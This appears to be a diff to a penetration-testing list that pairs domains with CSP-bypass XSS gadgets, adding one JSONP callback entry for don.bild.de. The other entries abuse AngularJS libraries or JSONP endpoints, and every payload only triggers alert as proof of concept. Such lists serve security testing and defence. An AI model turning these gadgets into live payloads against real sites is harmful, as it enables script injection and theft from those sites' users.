@@ -46,6 +46,7 @@ cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=00047028345
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 developer.apple.com	<body ng-app ng-csp><script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+don.bild.de	<script src="https://don.bild.de/glg/userDetails?callback=alert"></script>
 dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>
 dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
